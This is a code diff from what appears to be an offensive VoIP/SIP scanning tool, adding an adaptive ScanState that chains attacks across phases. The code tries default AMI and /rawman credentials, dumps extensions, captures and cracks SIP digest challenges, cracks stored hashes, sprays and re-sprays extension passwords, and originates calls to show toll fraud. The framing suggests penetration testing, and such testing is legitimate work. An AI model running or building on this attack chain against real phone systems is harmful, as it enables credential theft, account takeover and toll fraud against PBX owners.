@@ -107,6 +107,133 @@ def _jitter_sleep(jitter: float) -> None:
 
 
 # ---------------------------------------------------------------------------
+# Adaptive scan state — single mutable object shared across all phases
+# for one host.  Two live-updating pools drive inter-phase chaining:
+#   EXTENSION_LIST  — every confirmed extension (deduped, ordered by confidence)
+#   CRACK_POOL      — passwords to try first in spray, ordered by hit-probability
+# ---------------------------------------------------------------------------
+
+from dataclasses import dataclass as _dc, field as _field
+
+
+@_dc
+class ScanState:
+    """Mutable scan context for a single host.
+
+    Populated incrementally as phases run; downstream phases read the
+    current state rather than re-discovering information.
+    """
+    ip: str
+    fingerprint: str = ""
+
+    # Open port list from discovery
+    open_ports: list[dict] = _field(default_factory=list)
+
+    # SIP connection parameters (patched in place on auto-recovery)
+    sip: dict | None = None
+    sip_port: int = 5060
+    sip_tcp: bool = False
+    sip_tls: bool = False
+
+    # ── Live-updating pools ───────────────────────────────────────────────
+    # All known extensions, deduplicated.  Each entry is a dict with at
+    # minimum keys: extension, auth_required, anonymous_invite, open_register,
+    # source ("enum" | "ami_dump" | "synthetic").
+    extension_list: list[dict] = _field(default_factory=list)
+
+    # Passwords to promote to the front of every spray run.
+    # Ordered: AMI password first, then SIP-cracked, then hash-cracked.
+    crack_pool: list[str] = _field(default_factory=list)
+
+    # Extensions whose credentials have already been confirmed — skip re-spray.
+    confirmed_exts: set[str] = _field(default_factory=set)
+
+    # ── Phase outputs (mirror of the old hr dict keys) ────────────────────
+    http_findings: list[dict] = _field(default_factory=list)
+    cve_findings: list[dict] = _field(default_factory=list)
+    cve_auth_bypass_triggered: bool = False   # True when an auth-bypass CVE confirmed
+    ami: dict | None = None
+    ami_http: dict | None = None
+    credentials_found: list[dict] = _field(default_factory=list)
+    cracked_credentials: list[dict] = _field(default_factory=list)  # from hash cracking
+    call_test: dict | None = None
+    subscribe_probes: list[dict] = _field(default_factory=list)
+    refer_probe: dict | None = None
+
+    def add_extensions(self, exts: list[str], source: str = "enum") -> int:
+        """Add new extensions to extension_list (deduplicated).
+
+        Returns the number of net-new extensions added.
+        """
+        existing = {e["extension"] for e in self.extension_list}
+        added = 0
+        for ext in exts:
+            if ext not in existing:
+                self.extension_list.append({
+                    "extension": ext,
+                    "auth_required": True,
+                    "anonymous_invite": False,
+                    "open_register": False,
+                    "source": source,
+                })
+                existing.add(ext)
+                added += 1
+        return added
+
+    def add_to_crack_pool(self, passwords: list[str]) -> int:
+        """Prepend new passwords to crack_pool (deduplicated, preserving order).
+
+        Returns the number of net-new passwords added.
+        """
+        existing = set(self.crack_pool)
+        added = 0
+        new_pw: list[str] = []
+        for pw in passwords:
+            if pw and pw not in existing:
+                new_pw.append(pw)
+                existing.add(pw)
+                added += 1
+        # Prepend so callers see highest-confidence passwords first
+        self.crack_pool = new_pw + self.crack_pool
+        return added
+
+    def spray_targets(self) -> list[str]:
+        """Return extension strings that still need spraying."""
+        return [
+            e["extension"] for e in self.extension_list
+            if e.get("auth_required") and e["extension"] not in self.confirmed_exts
+        ]
+
+    def to_host_report(self) -> dict:
+        """Convert to the legacy hr dict consumed by report.write_all()."""
+        return {
+            "ip": self.ip,
+            "open_ports": self.open_ports,
+            "sip": self.sip,
+            "fingerprint": self.fingerprint,
+            "extensions": self.extension_list,
+            "credentials_found": self.credentials_found,
+            "http_findings": self.http_findings,
+            "cve_findings": self.cve_findings,
+            "ami": self.ami,
+            "ami_http": self.ami_http,
+            "call_test": self.call_test,
+            "subscribe_probes": self.subscribe_probes,
+            "refer_probe": self.refer_probe,
+        }
+
+
+# CVE IDs whose confirmation should trigger deeper authentication attacks
+# even when no extensions were enumerated.
+_AUTH_BYPASS_CVES: frozenset[str] = frozenset({
+    "CVE-2025-66039",   # FreePBX webserver auth bypass
+    "CVE-2023-37315",   # Grandstream auth bypass
+    "CVE-2019-19006",   # FreePBX unauthenticated admin
+    "CVE-2021-37748",   # Grandstream UCM RCE (implicit auth bypass)
+})
+
+
+# ---------------------------------------------------------------------------
 # External tool detection & NAT/firewall bypass helpers
 # ---------------------------------------------------------------------------
 
@@ -838,6 +965,362 @@ def _resolve_network_arg(value: str) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Phase helpers — each takes a ScanState and mutates it in place.
+# All inter-phase data flows through the ScanState pools.
+# ---------------------------------------------------------------------------
+
+
+def _phase_ami_attack(
+    state: "ScanState",
+    args,
+    col: "Colours",
+    traffic_log,
+    source_port_range,
+) -> None:
+    """Phase: AMI / management attack.  On success, immediately feeds
+    loot into state.extension_list and state.crack_pool so that
+    subsequent enum and spray phases start with ground-truth data.
+    """
+    ami_open = any(p["service"] == "Asterisk-AMI" for p in state.open_ports)
+    if ami_open:
+        _info(f"Trying AMI default credentials on TCP/{args.ami_port}...", col)
+        _jitter_sleep(args.jitter)
+        ami_res = ami.attack(
+            state.ip, port=args.ami_port,
+            timeout=args.timeout, traffic_log=traffic_log,
+        )
+        state.ami = asdict(ami_res)
+        if ami_res.success:
+            _finding(
+                "critical",
+                f"AMI pwned: {col.BOLD}{ami_res.username}/{ami_res.password}{col.RESET}  "
+                f"({len(ami_res.extensions)} extensions, "
+                f"{len(ami_res.voicemail_boxes)} voicemail boxes dumped)",
+                col,
+            )
+            # ── Feed loot into adaptive pools IMMEDIATELY ─────────────────
+            if ami_res.extensions:
+                n_new = state.add_extensions(ami_res.extensions, source="ami_dump")
+                if n_new:
+                    _ok(
+                        f"[ADAPTIVE] AMI loot: {n_new} new extension(s) injected "
+                        f"into EXTENSION_LIST → available to enum + spray now",
+                        col,
+                    )
+            if ami_res.password:
+                n_new = state.add_to_crack_pool([ami_res.password])
+                if n_new:
+                    _ok(
+                        f"[ADAPTIVE] AMI password promoted to front of CRACK_POOL "
+                        f"→ will be tried first in every spray pass",
+                        col,
+                    )
+        elif ami_res.reachable:
+            _warn("AMI reachable but no default creds matched.", col)
+        else:
+            _info("AMI port not reachable.", col)
+
+    # Asterisk HTTP rawman API
+    http_attack_port = args.http_attack_port
+    _info(f"Trying Asterisk HTTP /rawman on port {http_attack_port}...", col)
+    _jitter_sleep(args.jitter)
+    ami_http_res = ami.attack_asterisk_http(
+        state.ip, port=http_attack_port, timeout=args.timeout,
+    )
+    state.ami_http = asdict(ami_http_res)
+    if ami_http_res.success:
+        _finding(
+            "critical",
+            f"Asterisk HTTP /rawman authenticated: "
+            f"{col.BOLD}{ami_http_res.username}/{ami_http_res.password}{col.RESET}",
+            col,
+        )
+
+
+def _phase_cve_check(
+    state: "ScanState",
+    args,
+    col: "Colours",
+    sip_port: int,
+    report_dir: str,
+    traffic_log,
+) -> None:
+    """Phase: CVE / vulnerability scan.  Platform fingerprint gates which
+    checks run.  Auth-bypass CVE confirmations set
+    state.cve_auth_bypass_triggered so the spray phase runs harder.
+    Cracked passwords from cleartext capture go into state.crack_pool.
+    """
+    if not _CVE_AVAILABLE:
+        _warn("CVE module not available — skipping CVE scan.", col)
+        return
+
+    tcp_ports = sorted({p["port"] for p in state.open_ports if p["proto"] == "tcp"})
+    sip_info = state.sip or {}
+    sip_transport = sip_info.get("transport", "udp")
+    sip_tcp = sip_transport in ("tcp", "tls")
+    sip_tls = sip_transport == "tls"
+    sip_server_banner = sip_info.get("server", "")
+
+    _jitter_sleep(args.jitter)
+    cve_results = cve_module.check_all(
+        state.ip,
+        tcp_ports=tcp_ports,
+        fingerprint=state.fingerprint,
+        sip_server=sip_server_banner,
+        sip_port=sip_port,
+        timeout=args.timeout,
+    )
+    state.cve_findings = [
+        {
+            "cve_id": r.cve_id, "platform": r.platform,
+            "severity": r.severity, "host": r.host, "port": r.port,
+            "title": r.title, "evidence": r.evidence,
+            "remediation": r.remediation,
+            "affected_version": r.affected_version,
+        }
+        for r in cve_results
+    ]
+
+    for r in cve_results:
+        _verify_badge = (
+            f" {col.GREEN}[CONFIRMED]{col.RESET}" if getattr(r, "confirmed", True)
+            else f" {col.YELLOW}[CONFIG/VERSION]{col.RESET}"
+        )
+        _finding(r.severity, f"{r.cve_id} — {r.title}{_verify_badge}", col)
+
+        # ── Auth-bypass CVE → arm deeper spray ───────────────────────────
+        if r.cve_id in _AUTH_BYPASS_CVES and getattr(r, "confirmed", True):
+            state.cve_auth_bypass_triggered = True
+            _warn(
+                f"[ADAPTIVE] {r.cve_id} is an auth-bypass — "
+                "credential spray will run at maximum depth even with no enumerated extensions",
+                col,
+            )
+
+        # ── Cleartext SIP capture + auto-crack ───────────────────────────
+        if r.cve_id in ("CONFIG-SIP-TLS", "CONFIG-SIP-WS-PLAIN"):
+            _cap_port = 8088 if r.cve_id == "CONFIG-SIP-WS-PLAIN" else sip_port
+            _cleartext_ev = cve_module.capture_cleartext_sip_evidence(
+                state.ip, sip_port=_cap_port,
+                source_ip=args.source_ip, timeout=args.timeout,
+            )
+            _agg = _cleartext_ev.get("aggregated", {})
+            _has_creds = bool(_cleartext_ev.get("challenge"))
+            _has_keys = bool(
+                _cleartext_ev.get("sdp_crypto_echoed") or _agg.get("all_srtp_keys")
+            )
+            _has_intel = bool(
+                _agg.get("all_internal_ips") or _agg.get("all_extensions")
+            )
+            if _has_creds or _has_keys or _has_intel:
+                _show_cleartext_capture(_cleartext_ev, col)
+                if _has_creds and _CRACK_AVAILABLE:
+                    _challenge = _cleartext_ev.get("challenge", {})
+                    _crack_ext = _cleartext_ev.get(
+                        "extension",
+                        _agg.get("all_extensions", ["1000"])[0]
+                        if _agg.get("all_extensions") else "1000",
+                    )
+                    import threading as _th
+                    _crack_result: list = [None]
+
+                    def _do_crack(
+                        ch=_challenge, ext=_crack_ext, hst=state.ip,
+                        port=_cap_port, src=args.source_ip,
+                        to=args.timeout, tcp=sip_tcp, tls=sip_tls,
+                    ) -> None:
+                        _crack_result[0] = crack_module.crack_sip_digest_challenge(
+                            challenge=ch, extension=ext,
+                            host=hst, sip_port=port,
+                            source_ip=src, timeout=to,
+                            tcp=tcp, use_tls=tls,
+                            time_limit=50.0,
+                        )
+
+                    _ct = _th.Thread(target=_do_crack, daemon=True)
+                    _ct.start()
+                    _ct.join(timeout=55.0)
+                    if _crack_result[0]:
+                        _cracked_pw, _crack_src = _crack_result[0]
+                        _finding(
+                            "critical",
+                            f"SIP-CREDENTIAL-CRACKED — ext {col.BOLD}{_crack_ext}{col.RESET} "
+                            f"password: {col.RED}{col.BOLD}{_cracked_pw}{col.RESET}  "
+                            f"realm={_challenge.get('realm','?')}  source={_crack_src}",
+                            col,
+                        )
+                        cc_entry = {
+                            "extension": _crack_ext,
+                            "password": _cracked_pw,
+                            "realm": _challenge.get("realm", ""),
+                            "source": _crack_src,
+                        }
+                        state.cracked_credentials.append(cc_entry)
+                        # ── Feed into crack_pool IMMEDIATELY ──────────────
+                        n_new = state.add_to_crack_pool([_cracked_pw])
+                        if n_new:
+                            _ok(
+                                f"[ADAPTIVE] Cleartext-cracked password promoted to "
+                                f"CRACK_POOL → available to all subsequent spray passes",
+                                col,
+                            )
+
+
+def _phase_crack_hashes_and_respray(
+    state: "ScanState",
+    args,
+    col: "Colours",
+    sip_port: int,
+    report_dir: str,
+    traffic_log,
+    source_port_range,
+) -> None:
+    """Phase: offline hash cracking from sip_hashes.txt → extend CRACK_POOL
+    → targeted re-spray of only the new passwords against uncracked extensions.
+
+    This phase is a no-op when:
+    - crack module is unavailable
+    - sip_hashes.txt is empty or absent
+    - no new passwords are discovered by cracking
+    """
+    if not _CRACK_AVAILABLE:
+        return
+
+    hash_file = os.path.join(report_dir, "sip_hashes.txt")
+    if not os.path.exists(hash_file):
+        return
+
+    # Parse hash lines written by auth.spray() — format:
+    #   username*realm*nonce*uri*response
+    challenges: list[dict] = []
+    seen_nonces: set[str] = set()
+    try:
+        with open(hash_file) as _hf:
+            for line in _hf:
+                line = line.strip()
+                if not line:
+                    continue
+                parts = line.split("*")
+                if len(parts) == 5:
+                    username, realm, nonce, uri, response = parts
+                    if nonce not in seen_nonces:
+                        seen_nonces.add(nonce)
+                        challenges.append({
+                            "username": username,
+                            "realm": realm,
+                            "nonce": nonce,
+                            "uri": uri,
+                            "response": response,
+                        })
+    except OSError:
+        return
+
+    if not challenges:
+        return
+
+    sip_info = state.sip or {}
+    sip_transport = sip_info.get("transport", "udp")
+    sip_tcp = sip_transport in ("tcp", "tls")
+    sip_tls = sip_transport == "tls"
+
+    _info(
+        f"[CRACK_HASHES] {len(challenges)} unique challenge(s) in sip_hashes.txt — "
+        f"attempting offline crack...",
+        col,
+    )
+
+    newly_cracked_passwords: list[str] = []
+    for ch in challenges[:20]:  # cap at 20 unique challenges per host
+        ext = ch.get("username", "1000")
+        if ext in state.confirmed_exts:
+            continue  # already cracked via spray — skip
+        result = crack_module.crack_sip_digest_challenge(
+            challenge=ch,
+            extension=ext,
+            host=state.ip,
+            sip_port=sip_port,
+            source_ip=args.source_ip,
+            timeout=args.timeout,
+            tcp=sip_tcp,
+            use_tls=sip_tls,
+            time_limit=30.0,
+        )
+        if result:
+            cracked_pw, crack_src = result
+            _finding(
+                "critical",
+                f"[HASH-CRACK] ext {col.BOLD}{ext}{col.RESET} password: "
+                f"{col.RED}{col.BOLD}{cracked_pw}{col.RESET}  "
+                f"realm={ch.get('realm', '?')}  source={crack_src}",
+                col,
+            )
+            state.cracked_credentials.append({
+                "extension": ext,
+                "password": cracked_pw,
+                "realm": ch.get("realm", ""),
+                "source": crack_src,
+            })
+            newly_cracked_passwords.append(cracked_pw)
+
+    n_new = state.add_to_crack_pool(newly_cracked_passwords)
+    if n_new == 0:
+        _info("[CRACK_HASHES] No new passwords cracked from captured hashes.", col)
+        return
+
+    _ok(
+        f"[ADAPTIVE] {n_new} new password(s) cracked from SIP hashes → "
+        f"added to CRACK_POOL — running targeted re-spray now...",
+        col,
+    )
+
+    # Targeted re-spray: only the new passwords × all uncracked extensions
+    respray_targets = state.spray_targets()
+    if not respray_targets:
+        _info("[CRACK_HASHES] Re-spray skipped — no uncracked extensions remain.", col)
+        return
+
+    # Build a minimal cred list from the newly cracked passwords only
+    respray_creds: list[tuple[str, str]] = [
+        (ext, pw)
+        for pw in newly_cracked_passwords
+        for ext in respray_targets
+    ]
+    # auth.spray() takes (username, password) pairs; pass as self-password
+    _info(
+        f"[CRACK_HASHES] Re-spraying {len(newly_cracked_passwords)} new password(s) "
+        f"× {len(respray_targets)} extension(s)...",
+        col,
+    )
+    _jitter_sleep(args.jitter)
+    respray_hits = auth.spray(
+        state.ip,
+        respray_targets,
+        [],                          # empty wordlist — only ami_cracked_passwords used
+        port=sip_port,
+        timeout=args.timeout,
+        max_workers=min(args.workers, 10),
+        max_failures_per_ext=args.max_failures_per_ext,
+        traffic_log=traffic_log,
+        source_ip=args.source_ip,
+        tcp=sip_tcp,
+        use_tls=sip_tls,
+        ami_cracked_passwords=newly_cracked_passwords,  # promoted to front
+        hash_log_path=None,  # no need to re-log hashes we already cracked
+    )
+    for hit in respray_hits:
+        if hit.success:
+            hit_dict = asdict(hit)
+            state.credentials_found.append(hit_dict)
+            state.confirmed_exts.add(hit.extension)
+            _finding(
+                "critical",
+                f"[RE-SPRAY] Cracked: ext {col.BOLD}{hit.extension}{col.RESET}  "
+                f"{hit.username} / {col.BOLD}{hit.password}{col.RESET}",
+                col,
+            )
+
+
+# ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
 
@@ -999,19 +1482,24 @@ def main() -> int:
     host_reports: list[dict] = []
 
     for h in hosts:
-        hr: dict = {
-            "ip": h.ip,
-            "open_ports": h.open_ports,
-            "sip": h.sip,
-            "fingerprint": h.fingerprint,
-            "extensions": [],
-            "credentials_found": [],
-            "http_findings": [],
-            "cve_findings": [],
-            "ami": None,
-            "ami_http": None,
-            "call_test": None,
-        }
+        # Initialise the shared mutable scan state for this host.
+        # All phases read from and write to this object; the two pools
+        # (extension_list, crack_pool) carry live data between phases.
+        state = ScanState(
+            ip=h.ip,
+            fingerprint=h.fingerprint,
+            open_ports=h.open_ports,
+            sip=h.sip,
+            sip_port=args.port,
+            sip_tcp=(h.sip or {}).get("transport", "udp") in ("tcp", "tls"),
+            sip_tls=(h.sip or {}).get("transport", "udp") == "tls",
+        )
+        # Convenience aliases updated in place when SIP auto-recovery fires
+        sip_info   = state.sip or {}
+        sip_transport = sip_info.get("transport", "udp")
+        sip_tcp    = state.sip_tcp
+        sip_tls    = state.sip_tls
+        sip_port   = state.sip_port
 
         # ══════════════════════════════════════════════════════════════════
         _phase(f"PHASE 2 · HTTP PROBES  [{h.ip}]", col)
@@ -1020,7 +1508,7 @@ def main() -> int:
         if tcp_ports:
             _jitter_sleep(args.jitter)
             findings = http_probes.run_all(h.ip, tcp_ports, timeout=args.timeout)
-            hr["http_findings"] = [
+            state.http_findings = [
                 {"name": f.name, "severity": f.severity, "target": f.target,
                  "title": f.title, "evidence": f.evidence,
                  "remediation": f.remediation}
@@ -1037,142 +1525,27 @@ def main() -> int:
         # ══════════════════════════════════════════════════════════════════
         _phase(f"PHASE 2b · CVE / VULNERABILITY SCAN  [{h.ip}]", col)
 
-        sip_info = h.sip or {}
+        # sip_port / sip_tcp / sip_tls may be updated by SIP auto-recovery below;
+        # _phase_cve_check reads them from state after any patch.
+        _phase_cve_check(state, args, col, sip_port, report_dir, traffic_log)
+        # Refresh local aliases in case cve phase updated state.sip
+        sip_info      = state.sip or {}
         sip_transport = sip_info.get("transport", "udp")
-        sip_tcp = sip_transport in ("tcp", "tls")
-        sip_tls = sip_transport == "tls"
-        sip_port = args.port
+        sip_tcp       = sip_transport in ("tcp", "tls")
+        sip_tls       = sip_transport == "tls"
+        sip_port      = state.sip_port
+        if not state.cve_findings:
+            _info("No CVE/config findings on this host.", col)
 
-        sip_server_banner = sip_info.get("server", "")
-
-        if _CVE_AVAILABLE:
-            _jitter_sleep(args.jitter)
-            cve_results = cve_module.check_all(
-                h.ip,
-                tcp_ports=tcp_ports,
-                fingerprint=h.fingerprint,
-                sip_server=sip_server_banner,
-                sip_port=sip_port,
-                timeout=args.timeout,
-            )
-            hr["cve_findings"] = [
-                {
-                    "cve_id": r.cve_id, "platform": r.platform,
-                    "severity": r.severity, "host": r.host, "port": r.port,
-                    "title": r.title, "evidence": r.evidence,
-                    "remediation": r.remediation,
-                    "affected_version": r.affected_version,
-                }
-                for r in cve_results
-            ]
-            if cve_results:
-                for r in cve_results:
-                    _verify_badge = (
-                        f" {col.GREEN}[CONFIRMED]{col.RESET}" if getattr(r, "confirmed", True)
-                        else f" {col.YELLOW}[CONFIG/VERSION — not live-exploited]{col.RESET}"
-                    )
-                    _finding(r.severity, f"{r.cve_id} — {r.title}{_verify_badge}", col)
-                    # Unencrypted SIP: silently probe for live credentials/keys
-                    # Only surface output if real captured data is found
-                    if r.cve_id in ("CONFIG-SIP-TLS", "CONFIG-SIP-WS-PLAIN") and _CVE_AVAILABLE:
-                        _cap_port = 8088 if r.cve_id == "CONFIG-SIP-WS-PLAIN" else sip_port
-                        _cleartext_ev = cve_module.capture_cleartext_sip_evidence(
-                            h.ip, sip_port=_cap_port,
-                            source_ip=args.source_ip, timeout=args.timeout,
-                        )
-                        _agg = _cleartext_ev.get("aggregated", {})
-                        _has_creds = bool(_cleartext_ev.get("challenge"))
-                        _has_keys = bool(
-                            _cleartext_ev.get("sdp_crypto_echoed")
-                            or _agg.get("all_srtp_keys")
-                        )
-                        _has_intel = bool(
-                            _agg.get("all_internal_ips")
-                            or _agg.get("all_extensions")
-                        )
-                        if _has_creds or _has_keys or _has_intel:
-                            # Show capture — only because real findings exist
-                            _show_cleartext_capture(_cleartext_ev, col)
-                            # Auto-crack captured challenge — silent until confirmed
-                            if _has_creds and _CRACK_AVAILABLE:
-                                _challenge = _cleartext_ev.get("challenge", {})
-                                _crack_ext = _cleartext_ev.get(
-                                    "extension",
-                                    _agg.get("all_extensions", ["1000"])[0]
-                                    if _agg.get("all_extensions") else "1000",
-                                )
-                                _info(
-                                    f"  Auto-cracking captured challenge"
-                                    f" (realm={_challenge.get('realm','?')}"
-                                    f"  algo={_challenge.get('algorithm','MD5')}) …",
-                                    col,
-                                )
-                                import threading as _th
-                                _crack_result: list = [None]
-                                def _do_crack(
-                                    ch=_challenge, ext=_crack_ext, hst=h.ip,
-                                    port=_cap_port, src=args.source_ip,
-                                    to=args.timeout, tcp=sip_tcp, tls=sip_tls,
-                                ) -> None:
-                                    _crack_result[0] = crack_module.crack_sip_digest_challenge(
-                                        challenge=ch, extension=ext,
-                                        host=hst, sip_port=port,
-                                        source_ip=src, timeout=to,
-                                        tcp=tcp, use_tls=tls,
-                                        time_limit=50.0,
-                                    )
-                                _ct = _th.Thread(target=_do_crack, daemon=True)
-                                _ct.start()
-                                _ct.join(timeout=55.0)
-                                if _crack_result[0]:
-                                    _cracked_pw, _crack_src = _crack_result[0]
-                                    _finding(
-                                        "critical",
-                                        f"SIP-CREDENTIAL-CRACKED — ext {col.BOLD}{_crack_ext}{col.RESET} "
-                                        f"password: {col.RED}{col.BOLD}{_cracked_pw}{col.RESET}  "
-                                        f"realm={_challenge.get('realm','?')}  "
-                                        f"source={_crack_src}",
-                                        col,
-                                    )
-                                    # Store for use in spray/call phases
-                                    hr.setdefault("cracked_credentials", []).append({
-                                        "extension": _crack_ext,
-                                        "password": _cracked_pw,
-                                        "realm": _challenge.get("realm", ""),
-                                        "source": _crack_src,
-                                    })
-                        else:
-                            _info(
-                                "  Cleartext probe ran — no credentials intercepted on this exchange"
-                                " (PBX may not have challenged within timeout).",
-                                col,
-                            )
-                        # Hint: suggest live capture tools if available
-                        if _EXT_TOOLS.get("sngrep"):
-                            _info(
-                                f"  [sngrep] sngrep -d any host {h.ip} and port {_cap_port}",
-                                col,
-                            )
-                        elif _EXT_TOOLS.get("tcpdump"):
-                            _info(
-                                f"  [tcpdump] tcpdump -i any -A 'host {h.ip} and port {_cap_port}'",
-                                col,
-                            )
-            else:
-                _info("No CVE/config findings on this host.", col)
-        else:
-            _warn("CVE module not available — skipping CVE scan.", col)
-
-        if h.sip:
-            sip_srv = h.sip.get("server", "")
-            _ok(f"SIP/{sip_transport.upper()}: {h.sip.get('status')} {h.sip.get('reason')}  "
+        if state.sip:
+            sip_srv = state.sip.get("server", "")
+            _ok(f"SIP/{sip_transport.upper()}: {state.sip.get('status')} {state.sip.get('reason')}  "
                 f"server={col.BOLD}{sip_srv or '(hidden)'}{col.RESET}  "
-                f"fingerprint={col.CYAN}{h.fingerprint}{col.RESET}", col)
-            # Intel extraction from the SIP banner we already have
+                f"fingerprint={col.CYAN}{state.fingerprint}{col.RESET}", col)
             if _CVE_AVAILABLE:
                 _sip_banner_text = (
                     f"Server: {sip_srv}\n"
-                    f"Allow: {', '.join(h.sip.get('allow', []))}\n"
+                    f"Allow: {', '.join(state.sip.get('allow', []))}\n"
                 )
                 _banner_intel = cve_module._sip_intel_extract(
                     _sip_banner_text, "SIP-banner"
@@ -1184,14 +1557,17 @@ def main() -> int:
                 h.ip, h.open_ports, args.port, args.timeout, args.source_ip, col
             )
             if _disc_sip:
-                # AUTO-RECOVERY: patch h.sip and all local SIP variables so all
-                # subsequent phases (enum, spray, call PoC) run on the found port
-                h.sip = _disc_sip
-                sip_info = _disc_sip
-                sip_transport = _disc_sip.get("transport", "udp")
-                sip_tcp = sip_transport in ("tcp", "tls")
-                sip_tls = sip_transport == "tls"
-                sip_port = _disc_port
+                # AUTO-RECOVERY: patch state.sip and all local SIP variables so
+                # ALL subsequent phases (enum, spray, call PoC) run on the found port
+                state.sip      = _disc_sip
+                state.sip_port = _disc_port
+                state.sip_tcp  = _disc_tcp
+                state.sip_tls  = _disc_tls
+                sip_info       = _disc_sip
+                sip_transport  = _disc_sip.get("transport", "udp")
+                sip_tcp        = _disc_tcp
+                sip_tls        = _disc_tls
+                sip_port       = _disc_port
                 _ok(
                     f"AUTO-RECOVERED SIP on {sip_transport.upper()}/{sip_port} "
                     f"— full scan resuming (enum · spray · call PoC)",
@@ -1201,121 +1577,418 @@ def main() -> int:
         # ══════════════════════════════════════════════════════════════════
         _phase(f"PHASE 3 · AMI / MANAGEMENT ATTACK  [{h.ip}]", col)
 
+        # _phase_ami_attack populates state.ami, state.ami_http, and
+        # IMMEDIATELY injects loot into state.extension_list + state.crack_pool
+        # so that Phase 5 (enum) and Phase 6 (spray) start with ground-truth data.
         if args.ami_attack:
-            # TCP AMI (port 5038)
-            ami_open = any(p["service"] == "Asterisk-AMI" for p in h.open_ports)
-            if ami_open:
-                _info(f"Trying AMI default credentials on TCP/{args.ami_port}...", col)
+            _phase_ami_attack(state, args, col, traffic_log, source_port_range)
+            # If AMI originate is wanted, attempt it here (pre-SIP-enum path)
+            if (
+                state.ami and state.ami.get("success")
+                and args.call_test and args.call_to
+                and state.call_test is None
+            ):
+                ami_exts = state.ami.get("extensions") or []
+                originate_from = args.call_from or (ami_exts[0] if ami_exts else "1000")
+                _info(
+                    f"AMI originate PoC: {col.BOLD}{originate_from}{col.RESET} → "
+                    f"{col.BOLD}{args.call_to}{col.RESET}",
+                    col,
+                )
                 _jitter_sleep(args.jitter)
-                ami_res = ami.attack(h.ip, port=args.ami_port,
-                                     timeout=args.timeout,
-                                     traffic_log=traffic_log)
-                hr["ami"] = asdict(ami_res)
-                if ami_res.success:
-                    _finding("critical",
-                             f"AMI pwned: {col.BOLD}{ami_res.username}/{ami_res.password}{col.RESET}  "
-                             f"({len(ami_res.extensions)} extensions, "
-                             f"{len(ami_res.voicemail_boxes)} voicemail boxes dumped)",
-                             col)
-
-                    # Phase 3 bonus: try AMI originate as an alternative toll-fraud PoC
-                    if args.call_test and args.call_to:
-                        # Determine from-extension: prefer first AMI-dumped ext
-                        ami_exts = ami_res.extensions or []
-                        originate_from = args.call_from or (ami_exts[0] if ami_exts else "1000")
-                        _info(
-                            f"AMI originate PoC: {col.BOLD}{originate_from}{col.RESET} → "
-                            f"{col.BOLD}{args.call_to}{col.RESET}",
+                try:
+                    originate_result = ami.originate_call(
+                        h.ip,
+                        port=args.ami_port,
+                        username=state.ami["username"],
+                        password=state.ami["password"],
+                        call_from=originate_from,
+                        call_to=args.call_to,
+                        timeout=args.timeout,
+                        dry_run=args.call_dry_run,
+                    )
+                    if originate_result and getattr(originate_result, "success", False):
+                        _finding(
+                            "critical",
+                            f"AMI ORIGINATE toll fraud confirmed — call to "
+                            f"{args.call_to} placed via AMI",
                             col,
                         )
-                        _jitter_sleep(args.jitter)
-                        try:
-                            originate_result = ami.originate_call(
-                                h.ip,
-                                port=args.ami_port,
-                                username=ami_res.username,
-                                password=ami_res.password,
-                                call_from=originate_from,
-                                call_to=args.call_to,
-                                timeout=args.timeout,
-                                dry_run=args.call_dry_run,
-                            )
-                            if originate_result and getattr(originate_result, "success", False):
-                                _finding(
-                                    "critical",
-                                    f"AMI ORIGINATE toll fraud confirmed — call to "
-                                    f"{args.call_to} placed via AMI",
-                                    col,
-                                )
-                                if hr["call_test"] is None:
-                                    hr["call_test"] = {
-                                        "call_to": args.call_to,
-                                        "call_from": originate_from,
-                                        "success": True,
-                                        "reached_dialplan": True,
-                                        "status_code": "AMI",
-                                        "reason": "Originate via AMI",
-                                        "evidence": getattr(originate_result, "evidence", ""),
-                                        "trace": "",
-                                        "srtp_state": "off",
-                                        "dtmf_digits_sent": "",
-                                    }
-                            else:
-                                _info("AMI originate: call not confirmed (may need dialplan check).", col)
-                        except AttributeError:
-                            _info("ami.originate_call() not available in this build — skipping.", col)
-
-                elif ami_res.reachable:
-                    _warn(f"AMI reachable but no default creds matched.", col)
-                else:
-                    _info("AMI port not reachable.", col)
-
-            # Asterisk HTTP rawman API (port 8088)
-            http_attack_port = args.http_attack_port
-            _info(f"Trying Asterisk HTTP /rawman on port {http_attack_port}...", col)
-            _jitter_sleep(args.jitter)
-            ami_http_res = ami.attack_asterisk_http(
-                h.ip, port=http_attack_port, timeout=args.timeout
-            )
-            hr["ami_http"] = asdict(ami_http_res)
-            if ami_http_res.success:
-                _finding("critical",
-                         f"Asterisk HTTP /rawman authenticated: "
-                         f"{col.BOLD}{ami_http_res.username}/{ami_http_res.password}{col.RESET}",
-                         col)
-            elif ami_http_res.reachable:
-                _warn(f"Asterisk HTTP /rawman reachable but no default creds matched.", col)
-            else:
-                _info("Asterisk HTTP API not found on this host.", col)
+                        state.call_test = {
+                            "call_to": args.call_to,
+                            "call_from": originate_from,
+                            "success": True,
+                            "reached_dialplan": True,
+                            "status_code": "AMI",
+                            "reason": "Originate via AMI",
+                            "evidence": getattr(originate_result, "evidence", ""),
+                            "trace": "",
+                            "srtp_state": "off",
+                            "dtmf_digits_sent": "",
+                        }
+                    else:
+                        _info("AMI originate: call not confirmed (may need dialplan check).", col)
+                except AttributeError:
+                    _info("ami.originate_call() not available in this build — skipping.", col)
 
         # ══════════════════════════════════════════════════════════════════
-        _phase(f"PHASE 4 · TOLL-FRAUD CALL POC  [{h.ip}]", col)
+        # NOTE: Phase ordering — ENUM (5) and SPRAY (6) now run BEFORE
+        # the call test so that CONFIRMED_CREDS is fully populated when
+        # INVITE is sent.  The call PoC header is kept here for phase
+        # numbering continuity; the actual call block is executed after
+        # Phase 6 (see further below).
+        # ══════════════════════════════════════════════════════════════════
 
-        if not h.sip:
+        if not state.sip:
             _warn(
                 f"{h.ip}: all SIP transports exhausted — no reachable SIP port found.\n"
                 f"         Extension enumeration, credential spray, and call PoC cannot run.\n"
                 f"         Check recommendations in Phase 2b above for bypass paths.",
                 col,
             )
-            host_reports.append(hr)
+            host_reports.append(state.to_host_report())
             continue
 
         # --auto with no --call-to but creds found: hint the operator
-        if args.auto and not args.call_to and hr["credentials_found"]:
+        if args.auto and not args.call_to and state.credentials_found:
             _warn("  [!] Add --call-to <YOUR_NUMBER> to demonstrate live toll fraud", col)
+
+        # ══════════════════════════════════════════════════════════════════
